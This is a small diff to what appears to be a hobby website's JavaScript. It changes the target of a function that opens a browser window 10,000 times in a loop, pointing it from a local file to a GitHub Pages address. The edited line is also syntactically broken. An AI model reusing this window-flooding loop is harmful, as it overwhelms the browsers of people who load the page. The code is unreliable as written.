@@ -1,7 +1,7 @@
 
 function openTab(){
   for (let i = 0; i < 10000; i++) {
-    window.open("file:///Users/louisroseberry/Desktop/personnel/vs%20code%20projects/cool%20website/index.html");
+    window.open("file:"https://endberry.github.io/cool_website/");
   };
 };
 
